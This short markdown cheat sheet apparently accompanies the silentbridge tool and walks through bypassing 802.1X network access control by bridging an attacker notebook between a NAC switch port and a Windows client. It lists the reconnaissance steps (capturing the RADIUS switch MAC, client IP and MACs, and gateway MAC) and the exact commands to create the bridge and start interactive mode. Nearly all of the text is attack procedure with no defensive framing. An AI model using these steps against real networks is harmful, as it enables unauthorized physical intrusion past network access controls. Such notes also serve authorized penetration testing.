### source
https://github.com/s0lst1c3/silentbridge  

### required informations
```
disable DHCP and Network-Manager for used interfaces

upstream > attacker notebook to NAC ethernet port - example <interface1>  
physical > attacker notebook to windows client - example <interface2>  

get RADIUS switch MAC address (wireshark filter for eap) - example <mac1>  

get IP address of windows client - example <ip>  
get MAC address of windows client - example <mac2>  
get MAC address of default gateway - example <mac3>  
C> ipconfig /all  
```

### start silent bridge and listen
```
$> ./silentbridge --create-bridge --upstream <interface1> --phy <interface2> --sidechannel <interface1>
```

### start interactive mode
```
$> ./silentbridge --add-interaction --gw-mac <mac3> --client-ip <ip> --upstream <interface1> --client-mac <mac2> --phy <interface2> --switch-mac <mac1> --sidechannel <interface1>
```

